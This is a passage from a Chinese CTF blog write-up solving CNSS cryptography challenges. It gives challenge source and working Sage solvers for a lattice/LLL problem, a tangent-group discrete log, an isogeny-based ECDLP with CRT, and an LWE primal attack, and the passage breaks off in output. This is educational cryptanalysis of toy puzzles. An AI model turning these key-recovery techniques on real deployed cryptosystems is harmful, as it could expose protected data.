2.5Pro</strong>，这一次它构造的格和我们<strong>稍微不一样</strong>(最下面一行，它把0给规约出来了)，虽然我前面也想到了，拷打了两次，第二次调教一下配平(与<code>k</code><strong>平衡</strong>)，比<code>GPT</code>好用多了</p><p><strong>大常数C</strong>最重要(最好是2**160起步，但实际手测最小为2^137)，可能我之前也是缺这么个东西，导致规约出来的向量不理想(?)<br>其实之前也从别人<code>wp</code>看到过类似的情况，但自己还没有碰到过，算是长眼了</p><p>问AI补了一下知识：<strong>LLL算法</strong>找的是<strong>格L</strong>中的<strong>向量v</strong>，它的<strong>欧几里得范数</strong>要<strong>尽可能小</strong><br>如果解(<strong>v=c·L</strong>)正确(<strong>c=x0,x1,x2,x3,-k,1</strong>)，<strong>范数平方(最小)</strong>为$(x_{0}W_{0})^{2}+(x_{1}W_{1})^{2}+(x_{2}W_{2})^{2}+(x_{3}W_{3})^{2}+(kW_{4})^{2}+0$<br>大概会在$(x_{0}W_{0})^{2}$这个数量级(<strong>常数</strong>)附近位置(再大一点)，但如果解不正确，这时候我们假设<code>C</code>，范数平方会大于<code>(C·Z)^2</code>，且至少为<code>C^2</code><br>这是<strong>最坏</strong>的一种情况，但如果我们让 $C^{2}&gt;(x_{0}W_{0})^{2}$，我们就确保了<strong>下界</strong>，可以找到最小的欧几里得范数(正解)，从而找到目标向量v</p><blockquote><p>感觉还是有点小瑕疵，反正差不多就这个意思</p></blockquote><script type="math/tex; mode=display">\left [ \begin{matrix}x_{0}&x_{1}&x_{2}&x_{3}&-k&1\\\end{matrix} \right ]*\left [ \begin{matrix}W_{0}&0&0&0&0&C*a_{0}\\0&W_{1}&0&0&0&C*a_{1}\\0&0&W_{2}&0&0&C*a_{2}\\0&0&0&W_{3}&0&C*a_{3}\\0&0&0&0&W_{4}&C*n\\0&0&0&0&0&C*(-s)\\\end{matrix} \right ]\ =\left [ \begin{matrix}W_{0}x_{0}&W_{1}x_{1}&W_{2}x_{2}&W_{3}x_{3}&W_{4}(-k)&0\end{matrix} \right ]</script><p>$其实这题是flag2，因为flag1的x1位数固定，直接考flag2即可跳过flag1$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = <span class="number">3904064643893390361433617712655100029912556632089667501554029429639468928393101622043906144668453264281530453865022580589294831765389441377916901119131234356458963290551834945708721353433505601</span></span><br><span class="line">s = <span class="number">3604875074795055000123916123224108624958126368977597327049275476975598192797160984462664525867166641119496011661706120902314295453633878065433943707394662052729528152546793152201914658255139867</span></span><br><span class="line">a = [<span class="number">2730885493586765190463536251928549081027650544135162075248013764093382819365134392595553863394291517552006396494131206919459935145536152218329288354821904074559120766005594153544756912098945832</span>, <span class="number">2682794543299249423965520585343408877939482776908813108080125635950617712534116358263875473393216488846715164240099514620137387390122653676168840502450478268278599148289754303414710910342195076</span>, <span class="number">3056310241622299025529837725147575615329254835813066425883457571781120647010672396603486688297231719653298145480220955878347533091003144227093892753771160874705140077267221046644815086744932854</span>, <span class="number">4118287861218613731723595777607376442710273799564235506091542746021449841390393039734820750495517116647742753148077759431161482333337542591059373997816043305851015242515503798301490457740269149</span>]</span><br><span class="line"></span><br><span class="line">W = [</span><br><span class="line">    <span class="number">2</span>**(<span class="number">162</span> - <span class="number">64</span>),</span><br><span class="line">    <span class="number">2</span>**(<span class="number">162</span> - <span class="number">96</span>),</span><br><span class="line">    <span class="number">2</span>**(<span class="number">162</span> - <span class="number">128</span>),</span><br><span class="line">    <span class="number">2</span>**(<span class="number">162</span> - <span class="number">160</span>),</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">]</span><br><span class="line">C = n</span><br><span class="line">M = Matrix(ZZ, [</span><br><span class="line">    [W[<span class="number">0</span>], <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    C * a[<span class="number">0</span>]],</span><br><span class="line">    [<span class="number">0</span>,    W[<span class="number">1</span>], <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    C * a[<span class="number">1</span>]],</span><br><span class="line">    [<span class="number">0</span>,    <span class="number">0</span>,    W[<span class="number">2</span>], <span class="number">0</span>,    <span class="number">0</span>,    C * a[<span class="number">2</span>]],</span><br><span class="line">    [<span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    W[<span class="number">3</span>], <span class="number">0</span>,    C * a[<span class="number">3</span>]],</span><br><span class="line">    [<span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    W[<span class="number">4</span>], C * n],</span><br><span class="line">    [<span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    <span class="number">0</span>,    C * (-s)]</span><br><span class="line">])</span><br><span class="line">res = M.LLL()</span><br><span class="line"><span class="keyword">if</span> res[<span class="number">0</span>][<span class="number">5</span>] == <span class="number">0</span>:</span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        x.append(Integer(<span class="built_in">round</span>(res[<span class="number">0</span>][i] / W[i])))</span><br><span class="line">    X = [<span class="built_in">abs</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> x]</span><br><span class="line">    flag = <span class="string">&#x27;cnss&#123;&#x27;</span> + <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> X]) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found x values: <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not found&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="三…三角函数？-🚗-narcissu"><a href="#三…三角函数？-🚗-narcissu" class="headerlink" title="三…三角函数？(🚗 narcissu)"></a>三…三角函数？(🚗 narcissu)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">P = <span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> isPrime(P):</span><br><span class="line">    lis = [getPrime(<span class="number">48</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">    P = <span class="number">1</span> + <span class="number">4</span> * reduce(<span class="keyword">lambda</span> x, y: x * y, lis)</span><br><span class="line">x1 = getRandomInteger(<span class="number">6</span> * <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(x, -<span class="number">1</span>, P)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x1: <span class="built_in">int</span>, x2: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (x1 + x2) * inv(<span class="number">1</span> - x1 * x2) % P</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    tmp = a</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">            ans = add(ans, tmp)</span><br><span class="line">        tmp = add(tmp, tmp)</span><br><span class="line">        y &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x2 = mul(x1, bytes_to_long(flag))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;P = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x1 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x2 = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">P = 472958314625001949286760892821211871536814324967123614257153023707299229675608813176509</span></span><br><span class="line"><span class="string">x1 = 238328866712703378513058278097596198883342987522679076735041467171358733524094199996347</span></span><br><span class="line"><span class="string">x2 = 142236542616006661645511771838641346094908915542395871010964119785370551657030998834210</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>$这题的加法很眼熟，加上题目提示的三角函数，得到tan(\alpha+\beta)=\frac{tan(\alpha)+tan(\beta)}{1+tan(\alpha)tan(\beta)}的形式$<br>$而乘法是通过加法实现的，称之为标量乘法，令x=tan(\theta)$<br><code>x2 = mul(x1, bytes_to_long(flag))</code>可以理解为$tan(\theta_{2})=tan(\theta_{1}·m)$<br>$我们利用复数和欧拉公式做这样的一个映射$<br>$\phi(x)=\frac{1+i·x}{1-i·x}，i^{2}\equiv -1\ mod\ P，其中P=4k+1，表明平方根i存在(二次剩余QR)$<br>$根据欧拉公式，e^{i\theta}=cos(\theta)+isin(\theta)$<br>$有\phi(tan(\theta))=\frac{1+i\frac{sin(\theta)}{cos(\theta)}}{1-i\frac{sin(\theta)}{cos(\theta)}}=\frac{cos(\theta)+isin(\theta)}{cos(\theta)-isin(\theta)}=\frac{e^{i\theta}}{e^{-i\theta}}=e^{2i\theta}$<br>$\phi(add(x_{1},x_{2}))=\phi(tan(\theta_{1}+\theta_{2}))=e^{2i(\theta_{1}+\theta_{2})}=\phi(x_{1})·\phi(x_{2})$<br>$\phi(x_{2})=\phi(mul(x_{1},m))=\phi(x_{1})^{m}，因为乘法是通过倍加实现的$<br>$到了这一步就成了我们熟悉的离散对数DLP，只需要在模P的整数域中找到-1的模平方根即可$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">P = <span class="number">472958314625001949286760892821211871536814324967123614257153023707299229675608813176509</span></span><br><span class="line">x1 = <span class="number">238328866712703378513058278097596198883342987522679076735041467171358733524094199996347</span></span><br><span class="line">x2 = <span class="number">142236542616006661645511771838641346094908915542395871010964119785370551657030998834210</span></span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line">Fp = Zmod(P)</span><br><span class="line">i_p = Fp(-<span class="number">1</span>).sqrt()</span><br><span class="line"></span><br><span class="line">x1_fp = Fp(x1)</span><br><span class="line">x2_fp = Fp(x2)</span><br><span class="line">g_plus = (<span class="number">1</span> + i_p * x1_fp) / (<span class="number">1</span> - i_p * x1_fp)</span><br><span class="line">h_plus = (<span class="number">1</span> + i_p * x2_fp) / (<span class="number">1</span> - i_p * x2_fp)</span><br><span class="line"></span><br><span class="line">order = P - <span class="number">1</span></span><br><span class="line"><span class="comment"># 在 Fp 上求解</span></span><br><span class="line">m = discrete_log(h_plus, g_plus, <span class="built_in">ord</span>=order)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;🚩 Flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] time: <span class="subst">&#123;end - start&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">🚩 Flag: cnss&#123;y0u_4re_m4s7er_d1scr3te_l0g&#125;</span><br><span class="line">[*] time: <span class="number">180.23613619804382</span></span><br></pre></td></tr></table></figure><h2 id="椭…椭圆曲线？1-🦄-迷星叫"><a href="#椭…椭圆曲线？1-🦄-迷星叫" class="headerlink" title="椭…椭圆曲线？1(🦄 迷星叫)"></a>椭…椭圆曲线？1(🦄 迷星叫)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, key</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p=<span class="number">4</span> * prod(random.sample([*primes(<span class="number">3</span>, <span class="number">256</span>)], k = <span class="number">32</span>)) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">F = GF(p)</span><br><span class="line">ells = <span class="built_in">list</span>(prime_divisors((p + <span class="number">1</span>) // <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">A, P, ekey</span>):</span><br><span class="line">    E = EllipticCurve(F, [<span class="number">0</span>, A, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> (e, ell) <span class="keyword">in</span> <span class="built_in">zip</span>(ekey, ells):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> (Q := (p + <span class="number">1</span>) // ell * E.random_element()):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            phi = E.isogeny(Q)</span><br><span class="line">            P = phi(P)</span><br><span class="line">            E = phi.codomain()</span><br><span class="line">    phi = E.isomorphism_to(E.montgomery_model())</span><br><span class="line">    <span class="keyword">return</span> phi(P)</span><br><span class="line"></span><br><span class="line">m = <span class="number">4</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ekey = [random.randrange(<span class="number">0</span>, m) <span class="keyword">for</span> _ <span class="keyword">in</span> ells]</span><br><span class="line">    E = EllipticCurve(F, [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">    P = E.random_element()</span><br><span class="line">    Q = key * P</span><br><span class="line">    data.append((encrypt(<span class="number">0</span>, P, ekey).xy(), encrypt(<span class="number">0</span>, Q, ekey).xy()))</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key = long_to_bytes(key), mode = AES.MODE_ECB)</span><br><span class="line">enc = cipher.encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;data = <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;enc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 256164319887327000989059029935823287458865939529442604969219</span></span><br><span class="line"><span class="string">data = [((133322079708888134755019133444750161850879838598642433684887, 141662416810310244901219160105878753684218815280213343782668), (229143019021594526687304781835968753291812313242978239625102, 197368860501718054721602204458353352625750671877991598154057)), ((187134450081607478089479488801524874232630053794005900575216, 108690106297722459738228043998568418620629744138148194690181), (158737296444873957747216583327576148521622006828733278132244, 21759841797267370899319253789108512363816846645505810398443)), ((18592521600279966910815352919263447903089956838725738504356, 217007987923415358882996311453118946045551003198364830822737), (72802893837043345748680021219614457864560584498084819044335, 222972538476200390779435449736524404899986548610269476763396)), ((214951010493336432708756958146170664734100491612877932290657, 206792141318815098607404794799281385860758537898905322132398), (33011808565377048731911863657787101878775783475990031474694, 241862920640278847851897950044938935131848397480764375514952))]</span></span><br><span class="line"><span class="string">enc = b&#x27;|\xb3\x18/9YN\x11\xd4a\xc1\x11\x1648\xbaK\x8dt\xd5\x02\xa9\x94\xac\x95*[f\x07-+\xd1\xb2\x1a\\\xe8\x84\x8c\x85*N\x02f\x94\x1d\x91f%&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$曲线的阶N=P+1，光滑$<br>$此处的encrypt函数将曲线y^{2}=x^{3}+Ax^{2}+x\pmod P做同源映射，到蒙哥马利模型上，得到蒙哥马利曲线，并返回点在新模型下的坐标$</p><p>$data的生成：曲线y^{2}=x^{3}+x\pmod P$<br>$ECDLP: Q=key\cdot P，同时PQ每次都被同样的秘钥加密，然后做映射塞入到data中$</p><p>$通过点坐标可以恢复蒙哥马利曲线E’$<br>$因为是同源映射，Q’=key\cdot P’$<br>$但是用discrete_log求解方程的时候，求的其实是k$<br>$k\equiv key\pmod {order(P’)}$<br>$Q’=k\cdot P’$<br>$我们可以找到四个k，以及四次P’在E’上的阶，通过中国剩余定理恢复出key$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">p = <span class="number">256164319887327000989059029935823287458865939529442604969219</span></span><br><span class="line">data = [((<span class="number">133322079708888134755019133444750161850879838598642433684887</span>, <span class="number">141662416810310244901219160105878753684218815280213343782668</span>), (<span class="number">229143019021594526687304781835968753291812313242978239625102</span>, <span class="number">197368860501718054721602204458353352625750671877991598154057</span>)), ((<span class="number">187134450081607478089479488801524874232630053794005900575216</span>, <span class="number">108690106297722459738228043998568418620629744138148194690181</span>), (<span class="number">158737296444873957747216583327576148521622006828733278132244</span>, <span class="number">21759841797267370899319253789108512363816846645505810398443</span>)), ((<span class="number">18592521600279966910815352919263447903089956838725738504356</span>, <span class="number">217007987923415358882996311453118946045551003198364830822737</span>), (<span class="number">72802893837043345748680021219614457864560584498084819044335</span>, <span class="number">222972538476200390779435449736524404899986548610269476763396</span>)), ((<span class="number">214951010493336432708756958146170664734100491612877932290657</span>, <span class="number">206792141318815098607404794799281385860758537898905322132398</span>), (<span class="number">33011808565377048731911863657787101878775783475990031474694</span>, <span class="number">241862920640278847851897950044938935131848397480764375514952</span>))]</span><br><span class="line">enc = <span class="string">b&#x27;|\xb3\x18/9YN\x11\xd4a\xc1\x11\x1648\xbaK\x8dt\xd5\x02\xa9\x94\xac\x95*[f\x07-+\xd1\xb2\x1a\\\xe8\x84\x8c\x85*N\x02f\x94\x1d\x91f%&#x27;</span></span><br><span class="line"></span><br><span class="line">F = GF(p)</span><br><span class="line">remainders = []</span><br><span class="line">moduli = []</span><br><span class="line"><span class="keyword">for</span> i, ((xp, yp), (xq, yq)) <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">    xp, yp, xq, yq = F(xp), F(yp), F(xq), F(yq)</span><br><span class="line">    xp_sq_inv = (xp^<span class="number">2</span>)^-<span class="number">1</span></span><br><span class="line">    A_prime = (yp^<span class="number">2</span> - xp^<span class="number">3</span> - xp) * xp_sq_inv</span><br><span class="line">    E_prime = EllipticCurve(F, [<span class="number">0</span>, A_prime, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">    P_prime = E_prime(xp, yp)</span><br><span class="line">    Q_prime = E_prime(xq, yq)</span><br><span class="line">    order = P_prime.order()</span><br><span class="line">    moduli.append(order)</span><br><span class="line">    k = P_prime.discrete_log(Q_prime)</span><br><span class="line">    remainders.append(k)</span><br><span class="line">key = crt(remainders, moduli)</span><br><span class="line">key = long_to_bytes(<span class="built_in">int</span>(key), <span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key=key, mode=AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[+] Flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="格…格基规约？-❄️-White-Album-2"><a href="#格…格基规约？-❄️-White-Album-2" class="headerlink" title="格…格基规约？(❄️ White Album 2)"></a>格…格基规约？(❄️ White Album 2)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">150</span>)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(p, <span class="number">1</span> / <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">msg</span>):</span><br><span class="line">    L = <span class="number">512</span></span><br><span class="line">    lenL = random.randrange(<span class="number">0</span>, L - <span class="built_in">len</span>(msg) + <span class="number">1</span>)</span><br><span class="line">    lenR = L - <span class="built_in">len</span>(msg) - lenL</span><br><span class="line">    <span class="keyword">return</span> os.urandom(lenL) + msg + os.urandom(lenR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg</span>):</span><br><span class="line">    s = [bytes_to_long(msg[i : i + <span class="number">16</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line">    ls = <span class="built_in">len</span>(s)</span><br><span class="line">    Fp = GF(p)</span><br><span class="line">    A = random_matrix(Fp, ls * ls, ls)</span><br><span class="line">    s = vector(Fp, s)</span><br><span class="line">    e = vector(Fp, [random.randrange(-m, m + <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ls * ls)])</span><br><span class="line">    b = A * s + e</span><br><span class="line">    <span class="keyword">return</span> A, b</span><br><span class="line"></span><br><span class="line">A, b = encrypt(pad(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;A = <span class="subst">&#123;<span class="built_in">list</span>(A)&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;b = <span class="subst">&#123;<span class="built_in">list</span>(b)&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>$flag被前后pad为512字节，分成了32段的s，A是1024*32的随机矩阵，错误向量e_{i}\in [-2^{50},2^{50}]，还是很大的数$</p><p>$A的维度太大了，并且flag是被前后填充的，实际就可能中间的三四块，可以优化的地方是这两个$</p><p>但是不管了，先把糖醋小鸡块师傅的<a href="https://tangcuxiaojikuai.xyz/post/758dd33a.html">LWE-primal attack(优化版本)</a>拿过来跑了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">m,n,esz = <span class="number">512</span>, <span class="number">32</span>, <span class="number">2</span>**<span class="number">50</span></span><br><span class="line">start = time()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    p_str = f.readline().strip()</span><br><span class="line">    A_str = f.readline().strip()</span><br><span class="line">    b_str = f.readline().strip()</span><br><span class="line">    p = ast.literal_eval(p_str.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">    A_list = ast.literal_eval(A_str.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">    b_list = ast.literal_eval(b_str.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].strip())</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ, A_list[:m])</span><br><span class="line">b = vector(ZZ, b_list[:m])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primal_attack2</span>(<span class="params">A,b,m,n,p,esz</span>):</span><br><span class="line">    L = block_matrix(</span><br><span class="line">        [</span><br><span class="line">            [matrix(Zmod(p), A).T.echelon_form().change_ring(ZZ), <span class="number">0</span>],</span><br><span class="line">            [matrix.zero(m - n, n).augment(matrix.identity(m - n) * p), <span class="number">0</span>],</span><br><span class="line">            [matrix(ZZ, b), <span class="number">1</span>],</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">#print(L.dimensions())</span></span><br><span class="line">    Q = diagonal_matrix([<span class="number">1</span>]*m + [esz])</span><br><span class="line">    L *= Q</span><br><span class="line">    L = L.LLL()</span><br><span class="line">    L /= Q</span><br><span class="line">    res = L[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span>(res[-<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        e = vector(GF(p), res[:m])</span><br><span class="line">    <span class="keyword">elif</span>(res[-<span class="number">1</span>] == -<span class="number">1</span>):</span><br><span class="line">        e = -vector(GF(p), res[:m])</span><br><span class="line">    s = matrix(Zmod(p), A).solve_right((vector(Zmod(p), b)-e))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">s=primal_attack2(A,b,m,n,p,esz)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 攻击成功, 正在尝试恢复 Flag...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        padded_flag_bytes = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> val <span class="keyword">in</span> s:</span><br><span class="line">            integer_val = <span class="built_in">int</span>(val.lift())</span><br><span class="line">            padded_flag_bytes += long_to_bytes(integer_val, <span class="number">16</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 已恢复512字节的填充后消息。&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">b&#x27;cnss\&#123;[^\&#125;]+\&#125;&#x27;</span>, padded_flag_bytes)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            flag = <span class="keyword">match</span>.group(<span class="number">0</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;🎉🎉🎉 Flag 提取成功! 🎉🎉🎉&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[-] 未能在恢复的数据中找到 &#x27;cnss&#123;...&#125;&#x27; 格式的 Flag。&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 恢复的原始数据（可能包含乱码）如下:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(padded_flag_bytes)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 在 Flag 重建过程中发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[-] 攻击失败, 未能恢复向量 s。&quot;</span>)</span><br><span class="line"></span><br><span class="line">end = time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 总计用时 <span class="subst">&#123;end - start:<span class="number">.2</span>f&#125;</span>s&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[+] 攻击成功, 正在尝试恢复 Flag...</span><br><span class="line">[*] 已恢复<span class="number">512</span>字节的填充后消息。</span><br><span class="line"></span><br><span class="line">==================================================</span><br><span class="line">🎉🎉🎉 Flag 提取成功! 🎉🎉🎉</span><br><span 